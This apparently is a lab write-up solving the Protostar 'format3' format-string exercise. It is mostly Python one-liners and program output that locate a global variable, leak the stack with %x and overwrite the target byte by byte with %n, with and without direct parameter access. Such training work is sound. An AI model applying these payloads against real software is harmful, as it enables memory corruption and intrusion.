$ objdump -t format3 | grep target
080496f4 g     O .bss	00000004              target

So we have 4 addresses to modify:
0x080496f4
0x080496f5
0x080496f6
0x080496f7

Method 1
========================
- get to the format string on the stack:

$ python -c 'print "ABCD" + "X"* 3 + "%x"*12' | ./format3  | grep --color="auto" 41
ABCDXXX0bffff5d0b7fd7ff400bffff7d8804849dbffff5d0200b7fd8420bffff61444434241

- find 4 addresses:
$ python -c 'print "AAAABBBBCCCCDDDD" + "X"* 3 + "%x"*15' | ./format3  
AAAABBBBCCCCDDDDXXX0bffff5d0b7fd7ff400bffff7d8804849dbffff5d0200b7fd8420bffff61441414141424242424343434344444444
target is 00000000 :(

- modify them:
We use some junk to help us set ny value we want to the 4 bytes:
$ python -c 'print "AAAAXXXXBBBBXXXXCCCCXXXXDDDD" + "X"* 3 + "%x"*18' | ./format3  
AAAAXXXXBBBBXXXXCCCCXXXXDDDDXXX0bffff5d0b7fd7ff400bffff7d8804849dbffff5d0200b7fd8420bffff61441414141585858584242424258585858434343435858585844444444
target is 00000000 :(

- now replace AAAA, BBBB, CCCC, DDDD with \xf4\x96\x04\x08, ... 
$ python -c 'print "\xf4\x96\x04\x08XXXX\xf5\x96\x04\x08XXXX\xf6\x96\x04\x08XXXX\xf7\x96\x04\x08" + "X"* 3 + "%x"*10 + "%x"  + "%n" + "%x" + "%n" + "%x" + "%n" + "%x" + "%n"' | ./format3  
��XXXX��XXXX��XXXX��XXX0bffff5d0b7fd7ff400bffff7d8804849dbffff5d0200b7fd8420bffff614585858585858585858585858
target is 746c645c :(

Great, we can set every 4 bytes. Now to set them individually as we want: 0x01025544
$ python -c 'print "\xf4\x96\x04\x08XXXX\xf5\x96\x04\x08XXXX\xf6\x96\x04\x08XXXX\xf7\x96\x04\x08" + "X"* 3 + "%x"*10 + "%0240x" + "%n" + "%017x" + "%n" + "%0173x" + "%n" + "%0255x" + "%n"' | ./format3  
��XXXX��XXXX��XXXX��XXX0bffff5d0b7fd7ff400bffff7d8804849dbffff5d0200b7fd84200000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000bffff6140000000005858585800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000058585858000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000058585858
you have modified the target :)



Method 2
========================
[ Direct Parameter Access is explained also in 'Exploiting Format String Vulnerabilities' - scut / team teso]

We can transform the previous final version of the payload using 
direct parameter access, just by adjusting the paddings:

$ python -c 'print "\xf4\x96\x04\x08\xf5\x96\x04\x08\xf6\x96\x04\x08\xf7\x96\x04\x08" + "X"* 3 + "%1$049x%12$n" + "%1$017x%13$n" + "%1$0173x%14$n" + "%1$0255x%15$n"' | ./format3 
��������XXX00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
you have modified the target :)


